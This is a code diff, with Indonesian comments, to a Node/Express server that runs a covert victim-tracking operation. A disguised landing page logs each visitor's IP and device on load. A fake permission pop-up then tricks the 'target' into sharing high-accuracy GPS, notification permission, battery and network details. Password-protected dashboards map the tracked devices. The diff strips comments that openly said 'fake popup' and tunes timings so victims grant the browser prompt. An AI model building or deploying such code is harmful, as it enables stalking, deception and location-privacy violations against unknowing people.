@@ -95,9 +95,6 @@ app.post('/api/gps', (req, res) => {
   res.json({ ok: true });
 });
 
-// ==============================================================
-// DASHBOARD LIST (DESAIN GRID LEBIH RAPI)
-// ==============================================================
 app.get('/dash', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   const devices = new Map();
@@ -166,9 +163,6 @@ app.get('/dash', (req, res) => {
   </body></html>`);
 });
 
-// ==============================================================
-// DASHBOARD MAP (TEMA SURXRAT)
-// ==============================================================
 app.get('/dash/map', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   let devices = []; try { devices = JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8')); } catch (_) {}
@@ -256,9 +250,6 @@ app.get('/dash/map', (req, res) => {
   </body></html>`);
 });
 
-// ==============================================================
-// LANDING PAGE (FAKE POP-UP IZIN)
-// ==============================================================
 app.get('*', (req, res) => {
   const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
   res.type('html').send(`<!doctype html>
@@ -278,8 +269,6 @@ app.get('*', (req, res) => {
   .card{background:#fff;border-radius:12px;padding:20px;margin-bottom:16px;box-shadow:0 4px 6px rgba(0,0,0,0.05)}
   .card h3{margin:0 0 10px;font-size:18px}
   .card p{margin:0;font-size:14px;line-height:1.6;color:#475569}
-  
-  /* FAKE POPUP */
   .popup-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:0.3s}
   .popup-overlay.show{opacity:1;pointer-events:auto}
   .popup-box{background:#fff;border-radius:16px;padding:24px;width:85%;max-width:320px;text-align:center;transform:translateY(20px);transition:0.3s}
@@ -287,7 +276,7 @@ app.get('*', (req, res) => {
   .popup-icon{font-size:40px;margin-bottom:15px}
   .popup-box h3{margin:0 0 10px;font-size:18px;color:#0f172a}
   .popup-box p{margin:0 0 20px;font-size:13px;color:#64748b;line-height:1.5}
-  .popup-btn{background:#0f172a;color:#fff;border:none;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:bold;width:100%;cursor:pointer}
+  .popup-btn{background:#0f172a;color:#fff;border:none;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:bold;width:100%;cursor:pointer;transition:0.2s}
   .popup-btn:active{background:#334155}
 </style></head>
 <body>
@@ -304,7 +293,6 @@ app.get('*', (req, res) => {
   </div>
 </div>
 
-<!-- POP-UP PALSU (SAMARAN PERIZINAN) -->
 <div class="popup-overlay" id="popup">
   <div class="popup-box">
     <div class="popup-icon">📍</div>
@@ -318,27 +306,28 @@ app.get('*', (req, res) => {
 (async function(){
   const slug = '${slug}';
   
-  // Otomatis rekam IP & Device saat dibuka
+  // 1. Lacak IP & Device di background
   fetch('/api/geoip?s=' + encodeURIComponent(slug)).catch(()=>{});
 
-  // Munculin popup setelah 1 detik
+  // 2. Munculin popup setelah 1 detik
   setTimeout(() => {
     document.getElementById('popup').classList.add('show');
   }, 1000);
 
-  // Aksi saat klik "Oke, Izinkan Sekarang"
+  // 3. Aksi saat target klik tombol
   document.getElementById('allowBtn').addEventListener('click', async function() {
-    this.innerText = 'Memuat data...';
-    
-    // 1. Minta GPS
+    this.innerText = 'Memproses...';
+    this.disabled = true;
+
+    // Minta GPS
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:slug}) }).catch(()=>{}); },
-        e => {}, {enableHighAccuracy:true,timeout:15000}
+        e => {}, {enableHighAccuracy:true,timeout:10000}
       );
     }
 
-    // 2. Minta Izin Notif (OneSignal)
+    // Minta Notif OneSignal
     if (window.OneSignal) {
       try {
         await OneSignal.Notifications.requestPermission();
@@ -349,17 +338,18 @@ app.get('*', (req, res) => {
       } catch(e) { console.log(e); }
     }
 
-    // 3. Ambil data baterai & jaringan
+    // Ambil Baterai & Jaringan
     const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: slug };
     if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; } catch(e){} }
     if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
     fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
 
-    // Tutup popup
+    // Tutup popup setelah jeda 1.5 detik (biar target bisa klik izin browser)
     setTimeout(() => {
       document.getElementById('popup').classList.remove('show');
       this.innerText = 'Oke, Izinkan Sekarang';
-    }, 1000);
+      this.disabled = false;
+    }, 1500);
   });
 })();
 </script>
